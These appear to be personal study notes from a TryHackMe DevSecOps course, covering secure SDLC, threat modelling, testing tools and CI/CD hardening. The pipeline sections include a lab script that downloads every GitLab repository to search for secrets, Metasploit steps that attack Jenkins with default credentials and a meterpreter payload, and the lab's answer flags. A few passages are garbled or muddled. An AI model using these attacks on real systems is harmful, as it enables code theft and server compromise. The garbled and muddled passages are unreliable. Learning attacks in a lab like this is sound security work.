####Devsecops on thm focuses on securing pipelines throuh Iac and extends to containerization security.
#secure software development workflow
#Objectives
#Into to Devsecops(Secure SDLC, environments and tools)
#SDLC
#SSDLC(Secure Software Development LifeCycle)
#Security of Pipeline(Pipeline automation, Source code security, Automated Code Testing, Dependency Management, CI/CD and Environment Security)
#Security in the pipeline (Attacking the pipeline, Exploiting vulnerabilities in the pipeline, Defending the pipeline)
#Container security
#Infrastructure as Code (Cloud Devops, secret management, exploiting terraform, exploiting vagrant, exploiting docker)
- Agile: The methodology that relies on self-organizing teams that focus on constructive collaboration
- DevOps: The methodology that relies on AUTOMATION and INTEGRATION to drive cultural change and unite teams.
- Waterfall: The traditional approach to project management that led to MISTRUST and POOR COMMUNICATION between developmental teams.
DevOps emphasises "BUILDING TRUST"
- CI/CD: Helps in adding tests in an automated manner and dealing with frequent merging of code changes.
- MONITORING: Focuses on collecting data to analyse the performance and stability of services.
- IAC: A way to provision infrastructure through reusable and consistent code.
- Shift Left: DevOps teams focus on instilling SECURITY from the earliest stages in the development lifecycle and establishes a more
collaborative culture between DEVELOPMENT and SECURITY.
Benefits:
- Risks are reduced massively because security is introduced early in the SDLC
- No unnecessary stress because bug are discovered in later stages of SDLC s before
- No constant rollbacks because bugs are discovered in later stages
- No economic losses as a result of discovering security flaws or bugs late.
- Security flaws are discovered in early stages and these prevent stress, rollbacks and economic losses.
Implementing security at every stages of the SDLC will ensure the software is designed with security best practices.
The practice of SHIFTING LEFT in DevOps is called DEVSECOPS(Development approach whereby security is introduced from the early stages of development
lifecycle until the final stages).
Security is no more an add-on, it is a MUST DESIGN FEATURE.

Devsecops challenge that can lead to a siloed culture is called "SECURITY SILO"

#SDLC
- Planning
- Define requirements
- Design and prototyping
- Software development
- Testing
- Deployment
- Operations and maintenance
Requirement definition is the PHASE that focuses on determining the first idea for a prototype
The "Planning stage" is also known as "Feasibility stage"
You outline the user interfaces and network requirements at the "DESIGN and PROTOTYPING" phase
Software Requirement Specification(SRS): Document usually converted to logical structures implemented in programming languages.
Plans for operating, training and maintaining the system are drawn
Architecture Design Review(ARD): Created by engineers and developers to ensure that all teams working in different areas are on the same page
CALMS - Culture, Automation, Lean, Measureability and Sharing

#DevOps Metrics
- Meantime to Production (MTTP): Turnaround time for newly submitted code.
- Frequency of deployment: frequency of deployment of new releases, average lead time, how long does it take to develop, build, test
- Speed of deployment
- Deployment agility
- Production failure rate
- Meantime to Recover (MTTR): Measurement for recovery time after a failure
2 metrics that are used to measure deployment agility are "DEPLOYMENT SPEED and FREQUENCY"
Failure rate is an essential rate for engineers in Production environment to know if code meets security requirements.
Lab
- Add "+1" twice to the "Number of developers"
- Add "+10" 11x (11 times} to "Number of sprints"
- Click on "Next"
- Add "+1" to all the 7 phases of SDLC
- Add "+10" to all the 7 phases of SDLC
- Add "+10" 3x (3 times) to Deployment phase
- Add "+5" to "Software Deployment" phase
- Subtract "-1" 2x (2 times) from the "Software Development" phase
- Click on "Start Game"
- Click the "Next" button at the bottom until you do it for 12 months and get your result


####SSDLC
#Objectives:
#SSDLC and its importance
#Processes of SSDLC
#Secure SDLC Methodologies

#What is SDLC
Secure SDLC aims to introduce security at EVERY STAGE of the SDLC. This reduces cost and time by not discovering bugs, flaws and vulnerabilities late
It costs 6x more to fix a bug discovered at implementation stage rather than at early stage (design stage- IBM)
It costs 15x more to fix FLAWS if discovered at TESTING stage and 100x more if discovered at Operations and Maintenance stage-IBM
- Helps to reduce vulnerability
- Helps to reduce business risk
Incorporate security at
1. Architecture anaysis
2. Design
3. Code review
4. Scanning during development
5. Security assessment (penetration testing) before deployment

#Implementing SDLC
Understand security posture(before implementing SSDLC processes) by doing the following-
Perform a gap analysis: to know the activities and policies that exist in your org and how effective they are
Create Software Security Initiative(SSI) : Establish realistic and achievable goals with defined metrics for success. e.g playbook etc
Formalize processes
Invest in security training

SSDLC Processes
Integrating processes like security testing and other activities into an existing development processes e.g security requirements, 
functional requirements, architecture risk activities in design phase etc
Phases of SSDLC includes:
- Risk assessment (Planning)- Identify security considerations that promote a security by design when functional requirements are gathered
- Risk assessment (Define requirements) e.g a user requesting blog entry from a site, the user should not be able to "EDIT" the blog or remove unnecessary inputs
- Threat modelling (Design and prototype)- Process of identifying a potential threatwhen there is lack of appropriate safeguards. Should
happen in the design stage. Ensure there is a verification when a user request account's info.
- Code scanning and review (Software development)- Can be either manual or automated. Can leverage static and dynamic testing technology
- Code scanning and review (Testing)- Crucial in the development stage as code is being written
- Secure configuration (Deployment)
- Security assessments (Operations and Maintenance) e.g penetration testing and vulnerability assessments. Are automated that can identify
critical paths of an application that may lead to exploitation of a vulnerability
Carry out risk assessment during the planning and requirement stage
Carry out threat modelling during the design phase

#Risk Assessment
Risk refers to the likelihood of a threat being exploited, negatively impacting a resource or target it affects.
It is used to determine level of potential threats.
A risk assessment is usually followed by threat modelling.
Performing a risk analysis:
Assume the software will be attacked and consider the factors that will motivate the threat actor
- the data value of the program
- the security level of the companies who provide the resources the code depends on
- the clients purchasing the software
- how big is the software distributed ( small group or rleased worldwide)
Based on the factors, write down the acceptable level of risks. e.g losing millions due to fine paid after a data loss or eleiminating potential bugs in the security code with $40k
Risk evaluation is the next after risk assessment. Worst case scenario- assuming there is a ransomware attack. Determine the value of data
to be stolen e.g user's identity, credentials or data or assets with lower risks.
Some attacks only affect 1 or 2 users, but Denial of Service attack will affect thousand of users
Types of risk assessment:
Qualitative Risk Assessment: Most common that you will find in companies. Goa; is to assess and classify risks in THRESHOLDS like "LOW"
"MIDDLE", and "HIGH"
A typical formular for evaluating it is - "Risk" = "Severity" x "Likelihood"
Severity: Is the impact of consequence
Likelihood: Is the probability of it happening
Quantitative Risk Assessment: It is used to measure risk with numerical values. Numbers will represent low, medium, high. Use tools to determine
"Severity" and "Likelihood"
Risk assessments are better performed at THE BEGINNING OF SDLC, PLANNING and REQUIREMENT PHASES e.g
Customer data gets exfiltrated by an attack
Risk analysis- a customer can sue an org for $20k if their data get leaked
You have $2k customers
The Annual Rate of Occurrence is 0.001
Hence, Annual Loss Expectancy is $20k * $2k * 0.001 = $400k
Which means as long as the org's COMPENSATING SECURITY CONTROL is less than $400k, the org is not overspending.
Have a quatitative risk analysis matrix.
Formula to assign a qualitative risk level is "Risk * Likelihood"

#Threat Modelling
Integrate into DESIGN PHASE of an SDLC before any code is written. It is a structured process of identifying potential security threats
and prioritizing techniques to mitigate attacks so valuable data or assets (confidential)  are protected.
Several methods are used for threat modelling. Not all methods have the same purposes- some focus on RISK or PRIVACY CONCERN. Others are
CUSTOMER-FOCUSED. They can be combined too. Just know which ones align with your business or project. Common thread methodologies includes.

- STRIDE(Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation/Escalation of Privilege): It is developed
by Microsoft. It evaluates the system design in a more detailed view. You develop the system data flow diagram into it. STRIDE is built upon
CIA triad principle. You are trying to deal with the question- what could go wrong with the system?
Spoofing: Act of impersonation by a malicious actor. It violates CIA triad principle. Common ways include ARP, IP and DNS spoofing
Tampering: Modification of info by an unathorized user. Violates CIA triad principle
Repudiation: Not taking responsibilities for events where the actions are not attributed to the attacker.
Information Disclosure: An act of violation of confidentiality of triad. e.g data breaches.
Denial of Service: An authorized user cannot assess the service, assets or system due to exhaustion of network
Elevation/Escalation of privilege: Escalating privileges to gain unathorized access

- DREAD (Damage Potential, Reproducibility, Exploitability, Affected Users and Discoverability): It is also a method created by MICROSOFT
It can be a add-on to STRIDE MODEL.It is a model that ranks threats according to their SEVERITY and PRIORITY. It is scored based on RISK
PROBABILITY.
Damage: Possible damage a threat could cause to the existing infrastructure or targets. Based on a scale of 0 - 10. A score 0 means NOHARM
5 means Info disclosure, 8 means USER DATA IS COMPROMISED, 9 means INTERNAL OR ADMIN DATA IS COMPROMISED. 10 means UNAVAILABILITY OF SERVICE
Reproducibility: Measures complexity of the attack. A easy a hacker can replicate an attack. 0 means it is nearly impossible to copy, 5 means
complex but possible, 7.5 for an authenticated user, 10 means attacker can reproduce quickly without autnentication
Exploitability: Attack sophistication or how easy it would be to launch an attack. 2.5 means it would require an advanced skill, 5 means
can be exploited with available tools, 9 means needing a simple web application proxy tool, 10 means it can exploit through a web browser
Affected Users: Number of users affected by  the successful exploitation of vulnerability. 0 means no affected users, 2.5 means individual
user, 6 means a small group of users, 9 means significant users e.g admin users, 10 means users are affected.
Discoverability: Process of discovering vulnerable points in the process. 0 means challenging to be discovered.5 means can be discorvered
by analysis of HTTP requests, 8 means it can easily be found- public facing, 10 means visible in the browser address bar.

- PASTA: Process for Attack Simulation and Threat Analysis: risk-centric threat modelling framework. Focus is to allign TECHNICAL REQUIREMENTS
with BUSINESS OBJECTIVES. Analysis threats and find ways to mitigate them. Identifies the threats, enumerates them and assigns them a score.
It is divided into 7 stages-
Define objectives: Noting the structure and defining objectives.
Define technical scope: Architectural diagrams are defined, both logical and physical infrastructure.
Decomposition and analysis: Each asset will have a defined trust boundary that encompases its components and data in this stage.
Threat Analysis: Extracted info obtained from threat intelligence.
Vulnerabilities & Weaknesses Analysis: It analysis the vulnerabilities of web application security controls.
Attack/Exploit Enumeration and Modelling: Map out the possible threat landscape and entire attack surface of our web application.
Risk Impact Analysis: Analyse the scoped assets and make recommendations to mitigate the risks and eliminate the residual risks.

SUMMARY:
Dread is the threat modelling methodology that assigns a rating system based on risk probability
Stride is the threat modelling methodology based on CIA triad
Pasta is the modelling methodology that helps align technical requirements with business objectives

#Secure Coding
According to Verizon in 2020, 43% of attacks were on web applications and some of these security breaches were from vulnerabilities in
web applications. However, implementing code review and analysis in the implementation phase of the SDLC will increase the RESILIENCE
and SECURITY of the product without any additional cost for FUTURE PATCHING. By implementing it, the org will also be compliant to government
regulations. Code review can either be manual (expert or senior developers reviewing) or automated (using tools)
Code Analysis: Static and Dynamic Analysis. Static analysis examines the SOURCE CODE without executing the program. It DETECTS bugs at the
IMPLEMENTATION LEVEL. While Dynamic analysis EXAMINES the program when it is running. Dynamic analysis DETECTS errors during program
runtime. Automated Static Application Security Testing (SAST) automatically ANALYSES and CHECKS the source code.
SAST is also called WHITE BOX TESTING. It can HELP to DETECT VULNERABILITIES in the app before the code is merged or integrated into the software
Done before an app is LIVE and RUNNING, before code is merged and compiled. Once a VULNERABILITY is detected, the code will be CHECKED 
and PATCHED immediately, before the code is COMPILED and RELEASED.
So SAST is USED TO SCAN SOURCE CODE FOR SECURITY VULNERABILITIES.
SCA(Software Composition Analysis): It goes hand in hand with SAST. It is used to SCAN DEPENDENCIES for SECURITY VULNERABILITIES. helping
devs to track any OPEN-SOURCE COMPONENT brought into a project
DAST(Dynamic Application Security Testing): It is a BLACK BOX TESTING METHOD that DETECTS vulnerabilities at runtime. It is used to
DETECT vulnerabilities inside a web app that has been DEPLOYED to PRODUCTION. It sends alert to appropriate stakeholders for remediation
IAST(Interactive Application Security Testing): It ANALYSIS code for security vulnerabilities while the app is running. Usually deployed
side by side with the main application on the application server. It is designed for WEB and MOBILE apps to DETECT and REPORT issues even
while running. IAST was developed to STOP all limitations in SAST and SCA. It is called GRAY TESTING METHODOLOGY. It occurs in real-time
while the app is running in the STAGING ENVIRONMENT. They are typically deployed on the app servers post-build stage (after SAST runs in build,
DAST runs in staging before prod). The DAST agent inside the app server can detect a SQL injection for example.
RASP(Runtime Application Self Protection): Runtime app integrated into an app to analyse inward and outward traffic and end-users behavioral
patterns to prevent security attacks. It is used AFTER PRODUCT RELEASE.- Making it a security focused tool. It is a complete solution for
security.
STAGES AT WHICH EACH TOOL CAN BE USED:
Development: SAST and SCA
Integration: SCA
Acceptance Stage: SAST and DAST
Pre-Prod: DAST, SAST and IAST
Prod: RASP

#Security Assessments
It should be implemented in ALL PHASES where possible. It ACCESSES a SYSTEM, SOFTWARE or WEB APP for VULNERABILITIES and other ATTACK VECTORS
Usually carried out at the END of the SDLC(Operations and Maintenance), because they are more holistic. There are 2 types-
- Penetration Testing: It includes vulnerability testing and goes more in-depth. It involves TESTING/VALIDATING VULNERABILITIES, QUANTIFYING
RISKS and attempting to PENETRATE SYSTEM. A report is generated, suggesting countermeasures to mitigate against vulnerabilities. e.g recovering
an employee password by exploiting the mentioned vulnerability. 
PROS: 
- Can be used to display what attacker is capable of doing
- Can show how vulnerabilities can be exploited by attackers against an org - real risk
CONS:
- Very expensive
- Requires detailed planning and time
- Vulnerabilities Assessment: It focuses on finding vulnerabilities BUT don't validate the findings proving that they are xploitable.
Tools like Tenable, OpenVAS and ISS Scanner are used to scan networks and systems . They scan ports, services in the systems, IPs, service
versions in the database etc for vulnerabilities. They generate a report with a list of vulnerabilities found and their severity class (CVSS)
PROS:
- Suitable for quickly identifying potential vulnerability
- Cheaper than pentesting
- Part of pen testing
CONS:
- Can produce large number of reports
- Quality is dependent on the tool
- Not really in-depth


#SSDLC Methodologies
There are several methodologies used, but some of the popular ones are:
- Microsoft Security Development Lifecycle (SDL)
- OWASP Secure Software Development Lifecycle Project (S-SDLC)
- Software Security Touchpoints
SDL's principles:
- Secure by design - Security is in-built in the whole software lifecycle
- Secure by Default - Software are built to minimize potential harm caused by attackers. e.g deploying software with least privilege
- Secure in Development- deployment should be accompanied by tools and guidance supporting users and admins
- Communications - communications openly and freely with users and admins about threats
OWASP S-SDLC
High Level Security Risk Analysis - GATE 1(Agreement Concept/Priority) - Project Definition
Controls Selection - GATE 2(Agreement Project Definition) - Preliminary Design
Security Design Recview - GATE 3(Agreement Preliminary Design) - Detailed Design and Development
Penetration testing - GATE 4(Agreement Approve Build) - Deployment
SAMM is the Maturity Model that helps you measure TAILORED RISKS facing your organization.
BSIMM is the MATURITY MODEL that acts a measuring stick to determine your security posture.

#Secure Space Lifestyle

#Source Code and Version Control
Attackers using GITTYLEAKS to scan pipelines for secrets - it will look for commits that either have secrets or database strings or connections
committed or deleted from the repo.
Internal Dependency: Created by the organization
External dependency: Pypi, Nuget, Jquery, JFrog Artifactory, Azure Artifcats, Gems.
Automated Testing:
- Unit testing: It is a TEST CASE for a SMALL PART of the application or service. It is usually focused on functionality and not security
- Integration Testing: It focuses on how the small part of the application or services tested in unit test worki together. Testing for
Integration part of the pipeline. For CICD. A subset of it is REGRESSION TESTING. Not usually performed for security purposes.
- SAST: Used to scan source codes for vulnerabilities. Integrated to the dev process or CICD.
- DAST: Used to detect additional vulnerabilities that would not have been detected by ordinary code review(SAST) e.g cross site scripting
attack XSSlb,vvncmbmvn nnvbnvvvc,bv,v v mccmm,v,m;b;.h.h
- Pentration Testing: Used to detect what automated testing cannot. What IAST, RASP, SAST, and DAST cannot detect e.g
1) Credit card payment bypass
2) Business logic
3) Access control flaws
GitHub and GitLab have in-built SAST tool (native)
Snyk is a polpular SAST tool
Sonarqube is a popular SAST tool
COMMON MISCONFIGURATION WITH CICD PIPELINE:  Using the same BUILD AGENTS for both DEVELOPMENT(DEV) and PRODUCTION(PROD)
Since most devs will have access to starting trigger in both DEV and PROD. If one of the devs were compromised, an attacker could exploit the
their access t;;vvuiuyuohoyhhyyyyyyuyyyyhgggttyiyuytutv,hbbbbmggh,bo cause a MALICIOUS DEV build that would compromise the BUILD AGENT. Since the same agent is used for PROD too, an attacker
could persist exploiting this to PROD and inject it compromise the production environment/application.
Devs Bypasses in Prod:
- MFA
- CAPTCHA
- Password resets
- Login portals

###Insufficient credential hygiene e.g
- Insecurely storing credentials in code repositories
- Improper usage of credentials in build
- Improper usage of credentials in deployment processes
- Leaving credentials in container image layers
- Printing crdentials to console outputs
- Neglecting to rotate credentials
All the above can cause security breaches.

To prevent the above, practice or implement the below:
- Ensuring credentials follow the principle of least privilege
- Avoid sharing credentials across multiple contexts for accountability and privilege management
- Use temporary credentials and rotate credentials as frequent as possible
- Use credentials only in predefined conditions e.g using it for specifc IP address or identity
- Use IDE plugins, automatic scanning, and periodic repo commit scans to detect secrets pushed to and stored in code repo
- Use tools to prevent secrets being printed on cosnole
- Vvalidate removal secrets from artifacts.
- Use environment variables.

######PIPELINES
#######CICD AND BUILD SECURITY
After setting up a repository in GitLab-, the next thing in line is to connect the repo to a build tool or cicd tool
After the integration of CICD for build with Gitlab( repo), the next thing is to secure it. So, over here, we talk about the
set up of the CICD, build and repo and how to ensure their security.
Some commands used in the set up in THM includes
1) "ifconfig" or "ip a" to know the "IP of a network"
2)  "sudo echo <Gitlab IP> gitlab.tryhackme.loc >> /etc/hosts && sudo echo <Jenkins IP> jenkins.tryhackme.loc >> /etc/hosts"= to configure
"DNS" for the repo (GitLab) and build (Jenkins) for CICD. You need a landing page where you will input your credentials in order to access
either your repo and Jenkins. In order to connect to them, you can access your repo, which is already integrated with your build (Jenkins)
3) If the integration had been done already and the network or connection needs to be updated, modify the entries in the "/etc/host" folder
4) Validate the login of your repo or set up, by running this on a browser- "http://gitlab.tryhackme.loc "

#CICD AND BUILD SECURITY
A secure build environment is important to mitigate against POTENTIIAL threats and vulnerabilities
Lessons learnt from "SOLAR WINDS SUPPLY CHAIN ATTACK" is implemented in this module.
The 8 FUNDAMENTALS OF CICD ACCORDING TO GITLAB:
1) A single source repo: use single source repo to store all the required files and scripts to build the app
2) Frequent check-ins to the main branch: Perform code update frequently to ensure integrations as frequent as possible
3) Automated build: Builds need to be automated and executed as updates are pushed to the repo
4) Self-testing builds: As soon as updates are executed in the build, there needs to be an automated test for the builds
5) Frequent iterations: The more the frequency of your push, the less the conflict in the repo eventually
6) Stable testing environment: the testing environment for the code should mimick a production environment
7) Maximum visibility: Every or all devs should have access to the frequent changes or updates in the repo
8) Predictable deployment any time: streamline the pipeline to ensure that deployment are made anytime with no risk to production stability.

#SolarWinds Incident 2020
Attacker injected malicious code called SUNBURST into Orion software updates of Solarwinds. This enabled them to gain unauthorized access
into the networks of the org and several federal government agencies and private companies using SolarWinds. 
#Fallout
- Importance of securing software supply chains
- Impact of a single compromised VENDOR on many entities.

#Countermeasure to apply to environments to prevent against this incident
- Implement isolation and segmentation techniques- Seperating or segmenting various stages of build processes or environments will prevent
against a single point of compromise. When you implement CONTAINERIZATION and VIRTUALIZATION technologies to ensure ISOLATION of build process
in different stages, the entire system is not going to be compromised. When you ensure a STRICT ACCESS CONTROLS or create SANDBOXES to
execute SECURE BUILD PROCESSES, it will will prevent the exposure of the entire ENVIRONMENT.
- Set up appropriate access controls- Limit unauthorized access to the BUILD ENVIRONMENT to ensure the INTEGRITY and SECURITY of the system
1) Implement least privilege princip;e
2) Implement MFA
3) Enforce strong password policies
4) Regularly review and update the access controls to ensure that the policies align with least privilege
- Permissions to limit unauthorized access
- Implement appropriate network segmentation e.g divide the BUILD ENVIRONMENT to different NETWORK ZONES. Doing this can prevent POTENTIAL
BREACHES and LATERAL MOVEMENT
- Implement regular secure communication channels for software updates (3rd party tools)
- Regularly monitor and access the security of software suppliers to identify potential risks and vulnerabilities.
#CREATING A PIPELINE
- You will need to create a "PROJECT" in a yaml file for CI e.g in GitLab, Azure DevOps or whatever tool you are using
- You can DEFINE various jobs in the CI file.
- Usually the CI pipeline contains 3 stages:
1) Build
2) Test and
3) Deploy
However, there could be more than 3 stages.
Jobs in EACH STAGE are executed in PARALLEL i.e ALL BUILD JOBS ARE EXCEUTED SIMULTANEOUSLY and also TEST and DEPLOY.
The SCRIPT portion of a job SPECIFIES the command to be executed.
TEST job stage is to test the build job. Usually, if one test fails, others can still run and eventually you will have to review what
needs to be fixed to have a complete successful test.
At the DEPLOY stage, you will be deploying your code to production usually after all the tests have passed and code for this will have to be
pushed to the master or main branch, for it to be pushed. You could have other environments before this- DEV, UAT etc
Agents are called another name in GitLab- "RUNNERS"
#SECURING THE BUILD SOURCE
SOURCE CODE SECURITY
The FIRST STEP to securing the PIPELINE or BUILD is to secure the SOURCE. Trying to protect the SOURCE CODE against these 2 main issues
1) Unauthorized tampering: Ensuring that only authorized users are able to make CHANGES to the code. Controlling who has the ability to
PUSH new codes to the repo.
2) Unauthorized disclosure: Prevent against disclosing source code that is sensitive e.g Microsoft won't want to disclose Word source code.
Protect the IP
#CONFUSION OF RESPONSIBILITIES
Confusion of responsibilities always seep in large organizations mainly sue to management of granular access control or misconfiguration
e.g
- Leaving registration for code repo e.g Gitlab instance open to any user i.e all users internally
It may not be a DIRECT RISK but the attack surface grows e.g a bank having a 10,000 employees, and 2000 out of the 10,000 are devlopers, who
should ordinarily have access to it, but it is open to everybody, so the ATTACK SURFACE has grown by 500%. If one of the employees get
compromised by an attacker, the attacker would be able to exfiltrate any publicly shared repo.
- Because the gitlab instance is only accessible internally, a developer can configure a repo to be publicly shared. The danger is that
any user with a valid gitlab account can have access to that repo. Therefore the IP of the bank is publicly exposed.
#EXPLOITING A VULNERABLE BUILD SOURCE
- Efficiently ENUMERATE publicly visible repos using PYTHON SCRIPT:
- Create a connection to Gitlab (you will need a gitlab access token- API token)
1) Select profile icon
2) Select "Access token" from the navigation pane
3) Enter a name for the token
4) Select the access required- read, read_api, read_repo
4) Create the token. 
5) Add the token to the script to be able to successfully download publicly available projects.
- Run the command to get all Gitlab projects that are publicly accessible
- ENUMERATE through all the projects and download a copy of all th eprojects publicly accessible
- Extract all repos by running a "grep" for specific keywords e.g "secret" or passwords

The script:
import gitlab
import uuid

# Create a Gitlab connection
gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='glpat-TjQ4bSUSML5UUVf9Kg8S')
gl.auth()

# Get all Gitlab projects
projects = gl.projects.list(all=True)

# Enumerate through all projects and try to download a copy
for project in projects:
    print ("Downloading project: " + str(project.name))
    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
    UID = str(uuid.uuid4())
    print (UID)
    try:
        repo_download = project.repository_archive(format='zip')
        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        # Based on permissions, we may not be able to download the project
        print ("Error with this download")
        print (e)
        pass


#SECURING THE BUILD SOURCE
- Group based access control: Set permissions to gitlab projects at the group level. Same access rules will apply to all projects within
the group. e.g a group for DEV team with required permissions, for QA etc view, edit, or contribute to projects. It streamlines access
management and reduces chances of errors or oversights.
- Access levels: Assign appropriate access levels to USERS or Groups e.g Guest, Reporter, Develper, Maintener, Owner
- Sensitive information protection: Prevent accidental exposure of sensitive info. Gitlab features that can help prevent this are:
1) Gitlab's gitignore: It specifies which FILES or DIRECTORIES to be excluded from VERSION CONTROL e.g files containing passwords, API Keys
configuration files
2) Environment variables: Management of environment variables securely outside the code. Storing essential data or info needed during the
CICD process without exposing the repository
3) Branch protection: Protect main or master branch from direct pushes without review or approval i.e commits need to go through review
and automated testing before being pushed to the main branch

#SECURING THE BUILD PROCESS
#Ensuring that the build process does not have MISCONFIGURATION that can lead to COMPROMISE.
1) Managing Dependencies : First step in securing the BUILD PROCESS is securing DEPENDENCIES. e.g source code dependency on external library
and SDK for its functionality. For every build, these dependencies will be used to perform the build.
The 2 main CONCERNS (FEAR) for the build process when it comes to dependencies are
- Supply Chain Attacks - A THREAT ACTOR could take over this and inject malicious code
- Dependency Confusion - An ATTACKER could attempt a DEPENDENCY CONFUSION attack to inject a malicious code into the build process, if an
internally developed dependency is used.

FOCUSING ON MISCONFIGURATION IN THE BUILD PROCESS (What can be exploited by an attacker)
For a build process to kick off, there needs to be COMMUNICATION between the BUILD SERVER and the BUILD AGENT for the build to be performed.
An attacker could exploit this, since there are commands to be executed to complete the build. In order to REDUCE the attack surface or
prevent a threat actor from undermining the build process, the following needs be strictly considered-
- What actions do we allow to KICK OFF the build process?
- Who has PERMISSION to perform these actions to KICK OFF the BUILD PROCESS?
- Where will the BUILD PROCESS occur?
# What actions do we allow to KICK OFF the build process?
Deciding what actions can START the build process. By default, a commit to the pipeline will start the build process, but providing more
GRANULAR CONFIGURATION will reduce the attack surface e.g DECIDING THAT ONLY COMMITS TO SPECIFIC BRANCH e.g main/master should start the
PIPELINE. This way developers can make COMMITS to their branches directly. SO FAR the ability to COMMIT to the MAIN BRANCH or APPROVE MERGE
REQUEST is LIMITED, the attack surface of the pipeline will be limited.
To really tackle this and prevent the complications that arise from Mmerge request or breaking of pipeline through its activities, we can
consider using multiple branches/ environments before it reaches main/master - i.e run the pipeline in build environment, then qa , then uat
before running it in main that deploys to production. If anything will break the pipeline, you would have known before it gets to prod.
There could be a manual approval created to kick off to prod too.
#Who can start the build process
After deciding what actions can start the BUILD PROCESS, next is to define who can START the build process. There can be SMALL LIST of users
that can APPROVE the the MERGES.
#Where will the build occur
Build can be segregated and this will require build agents for different environments for the different builds. Build to the main branch
will have its own build agent and will be different from build agents of other environments.
#An example of Build Process Attack
- Exploiting a Merge Build
A user or someone that is managing the pipeline always test the MERGE REQUESTS before MERGING it to the main/master. So he ENABLES a CI/CD
on merge request i.e Once there is a merge request and the pipeline runs and succeeds, the merge will be considered for MERGING. i.e a nuild
will be EXECUTED to TEST the merge code as soon as a MERGE REQUEST is made. Jenkins enables this kind of feature by default. BUT the problem
is that it could lead to a COMPROMISE.
If the CI/CD is enabled by default, it means any user can modify the source and jenkinsfile and could inject a malicious code into it
- Changing the jenkinsfile can execute this.
#Best practices for protecting the build process
- Isolation and containerization - Running builds in isolated containers
- Least privilege - Restrict unnnecessary access to CICD tools
- Secret Management - Use CICD secte management tools to store credentials etc
- Immutable artifacts - Store build artifacts in a secure registry
- Dependency scanning - Integrate dependency scanning to identify and address vulnerabilities
- Pipeline as a code - Define CI/CD as a code, version-controlled, along side source code
- Regualr updates - Keep CICD up to dates in terms of vulnerabilities
- Logging and monitoring- Monitor build logs for unusual activities.
Where should you store artefacts to prevent tampering? Secure registry
What mechanism should you always use to store and inject sensitive data? Secret management
What attack can malicious actors perform to inject malicious code in the build process? Dependency confusion
Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? THM{7753f7e9-6543-4914-90ad-7153609831c3}

#Securing the Build Server
- Access ( Attack can guess credentials and gain access). With Jenkins, jenkins:jenkins could do the trick sometimes
So to SECURE build server access, we will RESTRICT ACCESS . Apply granular access to ensure that compromise of one user does not affect 
another, since it will be used by multiple users. Add MFA to it too.
#Using MSF module to attack jenkins server
- Start metasploit by running mfsfconsole
- set target 1
- set payload linux/x64/meterpreter/bind_tcp
- set password jenkins
- set username jenkins
- set RHOST jenkins.tryhackme.loc
- set targeturi /
- set rport 8080
- run
- getuid
#Protecting the build server
- Build Agent Configuration: Configure build agent to only communicate with build server; no external exposure
- Private Network: Place build agent within a PRIVATE NETWORK, preventing direct internal access
- Firewalls: Use firewalls to restrict access into the build agent network
- VPN: Use vpn to access the build server
- Token based authentication: Use token to authenticate.
- SSH Keys: Use secure SSH keys to authenticate for SSH based build agents
- Continuous monitoring: Regularly monitor build agent and servers for unsual behavior
- Regular updates: Regularly patch the build server
- Security audits: Conduct periodic security audits to address vulnerabilities.
- Remove defaults and harden configurations: Harden the build server and remove default credentials and weak configurations.
What can be used to ensure that remote access to the build server can be performed securely? vpn
What can be used to add an additional layer of authentication security for build agents? token-based authentication
Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? THM{1769f776-e03c-40b6-b2eb-b298297c15cc}

#Securing the Build Pipeline
Access gates:
Gates or checkpoints are stages within a software development pipeline.
They ensure that code progresses ONLY after MEETING predefined quality and security criteria. Access gates will ensure
1) Enhanced control: it allows for controlled progression to different stages
2) Quality Control: Ensures predefined quality standards are met before progression
3) Security Checks: Enables security accessment e.g vulnerability scan before deployment.
#Implementation steps
- Manual approvals - requires manual approval before progressing to the next stage
- Automated tests - for code quality, unit tests, integration tests etc
- Security scan - integrate security scan tools to detect vulnerability in the code base.
- Release gates - Use gates to verify proper documentation, versioning and compliance.
- Environment validation - validate the readines of the target environment before deployment
- Roll back plan - include a gate for roll back plan in case of post-deployment issues
- Monitoring - Implement monitoring to monitor progress of deployment and post-deployment
- Parallel gates- Run parallel gates to expedite the piepline without compromise
- Audit - Regularly review gate configurations
#The Two Person Concept:
No user must be able to pass any access gate single-handedly. Each access gates should require at least 2 users to be able to progress.
If a developer is COMPROMISED, a build cannot progress because their needs to be another developer required to approve the build
#Exploiting misconfigured access gates:
Even though the org's POLICY says merge request requires a Manager's approval. However, this needs to be ENFORCED within the technology or
tool being used e.g Gitlab indicates that APPPROVAL is optional. So, if it is not enabled on it, anybody should be able to merge requests
So eventhough, pushes are not directly to the main branch, devs can still make pushes to it through the merge request. Therefore an attacker
could exploit this.
#Protecting Pipeline
- Limit Branch Access: Only trusted devs should be given access to push to the main branch. Configure branch protection rules to require
reviews before allowing changes- Seetings/Repo/Default branch
- Review Merge Request: Enforce merge requests (or pull requests) to make main branch changes. Configure a merge request approvals to
ensure multiple team members review and approve changes.
- Use CI/CD Variables: Use CI/CD variables to STORE secrets like API keys, passwords, and tokens.
- Limit Runner Access: Only allow trusted runners to execute CI/CD jobs. Specify runners with tags can help. Only runners with appropriate
tags can run jobs on main branch.
- Access control and permissions: Review and configure project-level and group-level access controls and permissions.
- Regular Audits: Conduct regular audits of your CI/CD pipeline and configuration tools you are using.
- Monitor and Alert: Set up monitoring and alert for the pipeline.
What can we add so that merges are raised for review instead of pushing the changes to code directly? merge requests
What should we do so that only trusted runners execute CI/CD jobs? limit runner access
Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? THM{2411b26f-b213-462e-b94c-39d974e503e6}

#Securing The Build Environment
Securing the point where build is deployed to the environment
#Environment Segregation
Segregating environments. Devs are given a lot of access and abilities in envs other than prod environment and pre-prod environment.
A common misconfiguration is using THE SAME BUILD AGENT FOR ALL THE ENVIRONMENTS.
#One Build Agent To Rule Them All
Even when access is restricted for main branch and allow devs' access to only dev environment. If all branches are using same RUNNER(build agent),
An attacker could compromise the build agent in the DEV environment once a dev user's access is compromised. If that is compromised, the
prod environment is a toast.
#Protecting The Build Environment
- Isolate Environments: Seperate environments and use sepearate runners and tags
